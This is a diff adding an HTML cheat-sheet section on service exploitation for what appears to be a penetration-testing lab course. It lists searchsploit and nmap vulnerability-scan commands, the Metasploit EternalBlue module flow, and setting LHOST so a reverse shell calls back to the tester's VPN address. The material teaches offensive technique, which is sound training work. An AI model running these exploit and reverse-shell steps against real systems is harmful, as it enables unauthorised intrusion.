@@ -786,6 +786,83 @@
       </div>
     </section>
 
+    <!-- Category 3f: Service Exploitation & Initial Access -->
+    <section class="cheat-section" id="exploitation">
+      <div class="cheat-section__header">
+        <span style="font-size:1.25rem;">🎯</span>
+        <h2 class="cheat-section__title">Service Exploitation &amp; Initial Access (Lab 08)</h2>
+      </div>
+      <div class="cheat-table-container">
+        <table class="cheat-table">
+          <thead>
+            <tr>
+              <th style="width:40%;">Command</th>
+              <th style="width:25%;">Action</th>
+              <th style="width:25%;">How it works</th>
+              <th style="width:10%;">Source</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>searchsploit &lt;service&gt; &lt;version&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('searchsploit <service> <version>')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Look up a known exploit</strong></td>
+              <td>Searches your local copy of Exploit-DB for the exact service and version from your scan. The version is the key</td>
+              <td><a href="./labs/lab08.html#version-to-exploit" class="badge-lab-ref">Lab 08</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>searchsploit -x &lt;path&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('searchsploit -x <path>')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Read the raw exploit</strong></td>
+              <td>Opens the exploit's source so you can understand and fix it before running. Never run an exploit you haven't read</td>
+              <td><a href="./labs/lab08.html#no-metasploit" class="badge-lab-ref">Lab 08</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>nmap --script vuln -p 445 &lt;IP&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('nmap --script vuln -p 445 <IP>')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Flag known vulns during a scan</strong></td>
+              <td>Runs Nmap's vuln scripts against a port, e.g. detecting MS17-010 (EternalBlue) on SMB</td>
+              <td><a href="./labs/lab08.html#metasploit-exploit" class="badge-lab-ref">Lab 08</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>use exploit/windows/smb/ms17_010_eternalblue</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('use exploit/windows/smb/ms17_010_eternalblue')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Metasploit exploit flow</strong></td>
+              <td>In <code>msfconsole</code>: <code>search</code> → <code>use</code> → <code>show options</code> → <code>set RHOSTS</code>/<code>LHOST</code> → <code>exploit</code>. Same rhythm every module</td>
+              <td><a href="./labs/lab08.html#metasploit-exploit" class="badge-lab-ref">Lab 08</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>set LHOST &lt;YOUR_VPN_IP&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('set LHOST <YOUR_VPN_IP>')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Point the reverse shell at you</strong></td>
+              <td><code>RHOSTS</code> is the target, <code>LHOST</code> is you. Get <code>LHOST</code> wrong and the shell dials the wrong number. Use your <code>tun0</code> IP on a VPN</td>
+              <td><a href="./labs/lab08.html#bind-vs-reverse" class="badge-lab-ref">Lab 08</a></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
     <!-- Category 4: Transport Layer & Handshake State Probing -->
     <section class="cheat-section" id="tcp-handshake">
       <div class="cheat-section__header">
